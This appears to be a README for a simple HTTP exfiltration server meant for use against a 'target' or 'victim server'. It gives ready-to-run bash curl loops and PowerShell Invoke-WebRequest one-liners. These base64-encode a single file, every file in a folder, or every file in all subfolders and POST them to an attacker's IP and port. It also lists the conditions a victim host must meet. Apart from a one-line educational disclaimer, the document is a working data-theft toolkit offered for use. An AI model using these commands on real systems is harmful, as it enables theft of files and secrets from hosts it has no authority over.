# Summary
Hello guys, here I share an basic Python script to use as an Exfiltration Server.<br>
Remember that this is not an professional tool, it's simple for fast usage.<br>
This script may be really noisy, so be sure that you already collected everything silently<br>
If you have an idea of adjusts, let me know! :)<br>

> [!!!] Please be informed that the script provided is solely for informational and educational purposes only.

# Instructions
1 - Be sure that you are running the server using bash screen or tmux, to hold it opened<br>
2 - Run the command using Python3<br>
```bash
$ python3 exfil_server.py -p 1337
```
3 - Now on the target, there are some ways to exfiltrate, based on operation system:<br>

# Unix
- Single File
```bash
$ cat file.txt | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-
```

- Multiple Files on the same folder
```bash
$ ls -p | grep -v / >> files_list
$ for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
```

- Multiple Files on all the subfolders from the current directory
```bash
$ find ./ -type f >> files_list
$ for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
```

# Windows
- Single File
```powershell
powershell -c "$EncodedBase64 = [convert]::ToBase64String((Get-Content -path '.\sensitive_file.txt' -Encoding byte)); Invoke-WebRequest -Uri 'http://IP:PORT/post' -Method Post -Body $EncodedBase64"
```

- Multiple Files on the same folder
```powershell
powershell -c "$files = Get-ChildItem -File -Name; ForEach ($file in $files) {$EncodedBase64 = [convert]::ToBase64String((Get-Content -path $file -Encoding byte)); Invoke-WebRequest -Uri 'http://IP:PORT/post' -Method Post -Body $EncodedBase64}"
```

- Multiple Files on all the subfolders from the current directory
```powershell
powershell -c "$files = Get-ChildItem -File -Name -Recurse; ForEach ($file in $files) {$EncodedBase64 = [convert]::ToBase64String((Get-Content -path $file -Encoding byte)); Invoke-WebRequest -Uri 'http://IP:PORT/post' -Method Post -Body $EncodedBase64}"
```

# Requirements
Since we are talking of an HTTP Exfiltration, we should meet some requirements for the victim server:

- Free access to the internet
- No proxy (Some of them, may block)
- Curl installed
- Powershell acessible